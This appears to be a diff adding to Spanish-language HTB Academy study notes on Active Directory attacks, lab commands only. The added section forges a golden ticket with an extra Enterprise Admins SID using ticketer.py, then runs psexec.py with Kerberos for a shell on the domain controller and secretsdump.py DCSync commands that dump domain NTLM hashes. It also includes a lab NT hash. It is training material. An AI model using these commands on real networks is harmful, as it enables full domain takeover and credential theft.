@@ -1926,3 +1926,30 @@ Algo super interesante si nos damos cuenta en la captura el SID del grupo Enterp
 
 
 ![image](https://github.com/gecr07/HTB-Academy/assets/63270579/c0930dc0-ccad-4495-b4d5-e8470e71a038)
+
+
+Para crear el golden ticket
+
+```
+ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
+
+```
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/57d864c6-b4b7-4660-8e2d-3f2bd56765ff)
+
+
+```
+ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
+```
+
+### Ejercicio
+
+Pues para el ejercicio ya tendriamos un golden ticket entonces podemos hacer lo que sea en este caso un DCSYNC lo hice con el usuario admunn y con el hacket que creamos pero no se te olivde exportar la variable que tiene el golden ticket o no va a funcionar
+
+```
+export KRB5CCNAME=hacker.ccache
+secretsdump.py -just-dc-ntlm LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
+## Es mejor decirle que nos guarde todod como con el usuario admunn
+secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
+```
+
